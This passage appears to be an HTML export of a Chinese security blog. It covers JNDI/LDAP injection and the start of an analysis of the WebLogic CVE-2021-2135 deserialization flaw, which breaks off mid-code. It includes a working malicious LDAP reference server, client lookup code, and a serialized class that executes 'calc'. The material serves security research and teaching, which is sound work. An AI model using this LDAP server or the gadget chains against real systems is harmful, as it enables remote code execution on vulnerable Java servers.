LDAP_BASE = <span class="string">"dc=example,dc=com"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( String[] args )</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1389</span>;</span><br><span class="line"><span class="comment">//        if ( args.length &lt; 1 || args[ 0 ].indexOf('#') &lt; 0 ) &#123;</span></span><br><span class="line"><span class="comment">//            System.err.println(LDAPRefServer.class.getSimpleName() + " &lt;codebase_url#classname&gt; [&lt;port&gt;]"); //$NON-NLS-1$</span></span><br><span class="line"><span class="comment">//            System.exit(-1);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        else if ( args.length &gt; 1 ) &#123;</span></span><br><span class="line"><span class="comment">//            port = Integer.parseInt(args[ 1 ]);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="comment">//TODO 序列化一个对象保存</span></span><br><span class="line">        String url = <span class="string">"http://127.0.0.1:8000/"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">"listen"</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">"0.0.0.0"</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(url)));</span><br><span class="line"><span class="comment">//            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));</span></span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            <span class="comment">// 监听，当调用jndi.lookup会自动调用</span></span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            <span class="comment">// 创建一个条目</span></span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, IOException </span>&#123;</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * 序列化 存储java对象需要的属性</span></span><br><span class="line"><span class="comment">             * 1、javaClassName</span></span><br><span class="line"><span class="comment">             * 2、javaSerializedData</span></span><br><span class="line"><span class="comment">             * 3、javaCodeBase</span></span><br><span class="line"><span class="comment">             * */</span></span><br><span class="line">            System.out.println(<span class="string">"Send LDAP Serialize result for "</span> + base);</span><br><span class="line">            e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"foo"</span>);  <span class="comment">//java class</span></span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            e.addAttribute(<span class="string">"javaCodeBase"</span>, cbstring); <span class="comment">//class放置的位置即http服务位置</span></span><br><span class="line">            <span class="keyword">byte</span>[] javaSerializedData = Files.readAllBytes(<span class="keyword">new</span> File(<span class="string">"E:\\ser.txt"</span>).toPath()); <span class="comment">//读取序列化文件</span></span><br><span class="line">            e.addAttribute(<span class="string">"javaSerializedData"</span>, javaSerializedData); <span class="comment">//序列化数据</span></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapSerClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, IOException </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">"com.sun.jndi.ldap.object.trustURLCodebase"</span>,<span class="string">"true"</span>);</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        test object = (test) ctx.lookup(<span class="string">"ldap://127.0.0.1:1389/cn=foo,dc=example,dc=com"</span>);</span><br><span class="line">        System.out.println(object.toString());</span><br><span class="line">        object.calc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中序列化的对象类如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">3858195503738032307L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">calc</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果使用JNDI跟上面一样的道理，不过需要在<code>sendResult</code>中添加Java命名引用 <code>e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jndi.ldap.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.DirContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.InitialDirContext;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JndiAndLdap</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, IOException </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">"com.sun.jndi.ldap.object.trustURLCodebase"</span>,<span class="string">"true"</span>);</span><br><span class="line">        Hashtable env = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">"com.sun.jndi.ldap.LdapCtxFactory"</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">"ldap://localhost:1389"</span>);</span><br><span class="line"></span><br><span class="line">        DirContext ctx = <span class="keyword">new</span> InitialDirContext(env);</span><br><span class="line"></span><br><span class="line">        test local_obj = (test) ctx.lookup(<span class="string">"cn=foo,dc=example,dc=com"</span>);</span><br><span class="line">        System.out.println(local_obj.toString());</span><br><span class="line">        local_obj.calc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="利用方式总结："><a href="#利用方式总结：" class="headerlink" title="利用方式总结："></a>利用方式总结：</h4><p>JNDI可以通过<code>InitialContext.lookup</code>查找LDAP或RMI服务，LDAP可通过Referenceable objects方式存储Java对象。进一步调用远程HTTP服务下的恶意class文件，而RMI直接可调用注册在Registry中的远程对象。</p><p><img src="/imgs/image-20210812201948869.png" alt="image-20210812201948869"></p><h3 id="三、JdbcRowSetImpl"><a href="#三、JdbcRowSetImpl" class="headerlink" title="三、JdbcRowSetImpl"></a>三、JdbcRowSetImpl</h3><p><code>JdbcRowSetImpl</code>继承自<code>javax.sql.rowset.JdbcRowSet</code>，<code>JdbcRowSet</code>是一个连接的行集，也就是说，它使用支持JDBC技术的驱动程序不断维护与数据库的连接。</p><p>在<code>JdbcRowSetImpl</code>连接数据库时，会调用<code>InitialContext.lookup</code>方法来处理远程对象。lookup方法的参数通过<code>this.getDataSourceName()</code>获取，我们可以通过<code>setDataSourceName</code>设置这个参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InitialContext var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            <span class="comment">// 调用InitialContext.lookup</span></span><br><span class="line">            DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">""</span>) ? var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">"jdbcrowsetimpl.connect"</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span> ? DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在三个地方调用了connect方法</p><p><img src="/imgs/image-20210812163219123.png" alt="image-20210812163219123"></p><p>因此我们可以通过这三个方法来间接调用到<code>InitialContext.lookup</code>，当lookup参数设置成上面的rmi或ldap地址，或许我们就可以进行利用。</p><h3 id="四、参考链接："><a href="#四、参考链接：" class="headerlink" title="四、参考链接："></a>四、参考链接：</h3><p><a href="https://zhuanlan.zhihu.com/p/73428357" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/73428357</a><br><a href="https://paper.seebug.org/1207/#jndi" target="_blank" rel="noopener">https://paper.seebug.org/1207/#jndi</a><br><a href="https://zhuanlan.zhihu.com/p/32732045" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/32732045</a><br><a href="https://xz.aliyun.com/t/7079" target="_blank" rel="noopener">https://xz.aliyun.com/t/7079</a><br><a href="https://docs.oracle.com/javase/8/docs/api/javax/sql/rowset/JdbcRowSet.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/8/docs/api/javax/sql/rowset/JdbcRowSet.html</a><br><a href="https://docs.oracle.com/cd/E17824_01/dsc_docs/docs/jscreator/apis/rowset/com/sun/rowset/JdbcRowSetImpl.html" target="_blank" rel="noopener">https://docs.oracle.com/cd/E17824_01/dsc_docs/docs/jscreator/apis/rowset/com/sun/rowset/JdbcRowSetImpl.html</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> 序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JNDI </tag>
            
            <tag> LDAP </tag>
            
            <tag> JdbcRowSetImpl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebLogic CVE-2021-2135分析及POC构造遇到的问题</title>
      <link href="2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>文章首发于安全客：<a href="https://www.anquanke.com/post/id/248770。" target="_blank" rel="noopener">https://www.anquanke.com/post/id/248770。</a></p><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>早在今年4月 Weblogic发布了安全公告，里面有一个编号是CVE-2021-2135的反序列化漏洞，因为工作原因需要构造该漏洞POC，当时拿到了安全补丁，但是奈何太菜并没有解出来。后来360CERT发布了分析文章，花了一周多的时间终于把POC构造出来了。现在把分析学习及POC构造中遇到的问题记录下来。</p><p>4月与1月补丁<code>WebLogicFilterConfig.class</code>diff后如下，将<code>com.tangosol.internal.util.SimpleBinaryEntry</code>加入了黑名单。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private static final String[] DEFAULT_BLACKLIST_CLASSES &#x3D; new String[]&#123;&quot;oracle.jdbc.pool.OraclePooledConnection&quot;&#125;;</span><br><span class="line"></span><br><span class="line">private static final String[] DEFAULT_WLS_ONLY_BLACKLIST_CLASSES &#x3D; new String[]&#123;&quot;com.tangosol.internal.util.SimpleBinaryEntry&quot;&#125;;</span><br></pre></td></tr></table></figure><p>根据补丁反向推漏洞的话主要两部分命令执行载体和反序列化载体，命令执行载体达到我们执行命令的目的，反序列化载体从反序列化从入口到命令执行载体入口的动态执行，我们先分别来分析下。</p><h3 id="二、命令执行载体分析："><a href="#二、命令执行载体分析：" class="headerlink" title="二、命令执行载体分析："></a>二、命令执行载体分析：</h3><p>既然我们已经知道<code>com.tangosol.internal.util.SimpleBinaryEntry</code>在黑名单里，那么我们来分析下<code>com.tangosol.internal.util.SimpleBinaryEntry</code>的特性</p><h4 id="1、SimpleBinaryEntry的特性"><a href="#1、SimpleBinaryEntry的特性" class="headerlink" title="1、SimpleBinaryEntry的特性"></a>1、SimpleBinaryEntry的特性</h4><p><code>SimpleBinaryEntry</code>实现了<code>SerializerAware</code>、<code>ExternalizableLite</code>、<code>PortableObject</code>，<code>ExternalizableLite</code>用来处理序列化相关数据。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleBinaryEntry</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt; </span></span><br><span class="line"><span class="class"><span class="keyword">implements</span> <span class="title">Entry</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt;, <span class="title">SerializerAware</span>, <span class="title">ExternalizableLite</span>, <span class="title">PortableObject</span></span></span><br></pre></td></tr></table></figure><p><code>SimpleBinaryEntry</code>有2个可序列化属性和3个不可序列化属性，其中<code>m_binKey</code>和<code>m_binValue</code>是二进制类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JsonbProperty</span>(<span class="string">"binKey"</span>)</span><br><span class="line"><span class="keyword">protected</span> Binary m_binKey; <span class="comment">//二进制key，JsonbProperty作用是把该属性的名称序列化为另外一个名称，如把m_binKey属性序列化为binKey</span></span><br><span class="line"><span class="meta">@JsonbProperty</span>(<span class="string">"binValue"</span>)</span><br><span class="line"><span class="keyword">protected</span> Binary m_binValue; <span class="comment">//二进制value</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">transient</span> Serializer m_serializer;</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">transient</span> K m_key;</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">transient</span> V m_value;</span><br></pre></td></tr></table></figure><p><code>SimpleBinaryEntry</code>有参构造方法通过传参<code>BinaryEntry</code>或者key和value给属性<code>m_binKey</code>和<code>m_binValue</code>赋值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">SimpleBinaryEntry</span><span class="params">(Binary binKey, Binary binValue)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.m_binKey = binKey;</span><br><span class="line">    <span class="keyword">this</span>.m_binValue = binValue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>SimpleBinaryEntry</code>借助<code>m_serializer</code>通过<code>getKey</code>和<code>getValue</code>方法处理另外两个属性<code>m_key</code>和<code>m_value</code>。当其没有被赋值，会调用<code>ExternalizableHelper.fromBinary</code>来处理并返回结果，这时候的<code>m_key</code>和<code>m_value</code>处理后可以是指定类型的实例，而这也是漏洞的关键之处，我们可以通过构造将<code>m_key</code>或<code>m_value</code>转为我们想要的对象。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> K <span class="title">getKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    K key = <span class="keyword">this</span>.m_key;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 返回的是ExternalizableHelper.fromBinary(this.m_binKey,this.m_serializer)的结果</span></span><br><span class="line">        key = <span class="keyword">this</span>.m_key = ExternalizableHelper.fromBinary(<span class="keyword">this</span>.m_binKey, <span class="keyword">this</span>.getContextSerializer());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    V value = <span class="keyword">this</span>.m_value;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 返回的是ExternalizableHelper.fromBinary的结果</span></span><br><span class="line">        value = <span class="keyword">this</span>.m_value = ExternalizableHelper.fromBinary(<span class="keyword">this</span>.m_binValue, <span class="keyword">this</span>.getContextSerializer());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SimpleBinaryEntry重写了toString方法，我们可以通过该方法调用getKey。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"SimpleBinaryEntry(key=\""</span> + <span class="keyword">this</span>.getKey() + <span class="string">"\", value=\""</span> + <span class="keyword">this</span>.getValue() + <span class="string">"\")"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们来看下<code>ExternalizableHelper.fromBinary</code>。</p><h4 id="2、ExternalizableHelper-fromBinary"><a href="#2、ExternalizableHelper-fromBinary" class="headerlink" title="2、ExternalizableHelper.fromBinary"></a>2、<code>ExternalizableHelper.fromBinary</code></h4><p><code>ExternalizableHelper.fromBinary</code>最终会调用<code>ExternalizableHelper.deserializeInternal</code>处理，<code>deserializeInternal</code>方法如下，当<code>nType!=21</code>时调用<code>ExternalizableHelper.readObjectInternal</code>读取对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// serializer可以是SimpleBinaryEntry.this.m_serializer，buf可以是SimpleBinaryEntry.m_binKey或m_binValue</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">deserializeInternal</span><span class="params">(Serializer serializer, ReadBuffer buf, Function&lt;BufferInput, BufferInput&gt; supplierBufferIn, Class&lt;T&gt; clazz)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    BufferInput in = buf.getBufferInput();</span><br><span class="line">    <span class="keyword">int</span> nType = in.readUnsignedByte();</span><br><span class="line">    <span class="keyword">switch</span>(nType) &#123;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (supplierBufferIn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        in = (BufferInput)supplierBufferIn.apply(in);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// nType!=21，调用ExternalizableHelper.readObjectInternal</span></span><br><span class="line">    Object o = nType == <span class="number">21</span> ? serializer.deserialize(in, clazz) : readObjectInternal(in, nType, ((ClassLoaderAware)serializer).getContextClassLoader());</span><br><span class="line">    <span class="keyword">return</span> realize(o, serializer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ExternalizableHelper.readObjectInternal</code>会按照<code>nType</code>的值进行处理，根据<code>ExternalizableHelper.writeObjectnType</code>，在序列化时通过<code>getStreamFormat</code>进行赋值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// getStreamFormat:o instanceof ExternalizableLite ? 10，当对象是ExternalizableLite实例，nType=10</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getStreamFormat</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> o == <span class="keyword">null</span> ? <span class="number">0</span> : (o <span class="keyword">instanceof</span> String ? <span class="number">6</span> : (o <span class="keyword">instanceof</span> Number ? (o <span class="keyword">instanceof</span> Integer ? <span class="number">1</span> : (o <span class="keyword">instanceof</span> Long ? <span class="number">2</span> : (o <span class="keyword">instanceof</span> Double ? <span class="number">3</span> : (o <span class="keyword">instanceof</span> BigInteger ? <span class="number">4</span> : (o <span class="keyword">instanceof</span> BigDecimal ? <span class="number">5</span> : (o <span class="keyword">instanceof</span> Float ? <span class="number">14</span> : (o <span class="keyword">instanceof</span> Short ? <span class="number">15</span> : (o <span class="keyword">instanceof</span> Byte ? <span class="number">16</span> : <span class="number">11</span>)))))))) : (o <span class="keyword">instanceof</span> <span class="keyword">byte</span>[] ? <span class="number">8</span> : (o <span class="keyword">instanceof</span> ReadBuffer ? <span class="number">7</span> : (o <span class="keyword">instanceof</span> XmlBean ? <span class="number">12</span> : (o <span class="keyword">instanceof</span> ExternalizableHelper.IntDecoratedObject ? <span class="number">13</span> : (o <span class="keyword">instanceof</span> ExternalizableLite ? <span class="number">10</span> : (o <span class="keyword">instanceof</span> Boolean ? <span class="number">17</span> : (o <span class="keyword">instanceof</span> Serializable ? <span class="number">11</span> : (o <span class="keyword">instanceof</span> Optional ? <span class="number">22</span> : (o <span class="keyword">instanceof</span> OptionalInt ? <span class="number">23</span> : (o <span class="keyword">instanceof</span> OptionalLong ? <span class="number">24</span> : (o <span class="keyword">instanceof</span> OptionalDouble ? <span class="number">25</span> : (o <span class="keyword">instanceof</span> XmlSerializable ? <span class="number">9</span> : <span class="number">255</span>))))))))))))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ExternalizableHelper.readObjectInternal</code>代码如下，根据<strong>序列化数据的类型<code>nType</code></strong>进行反序列化读取对象，当nType=10，调用readExternalizableLite。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title">readObjectInternal</span><span 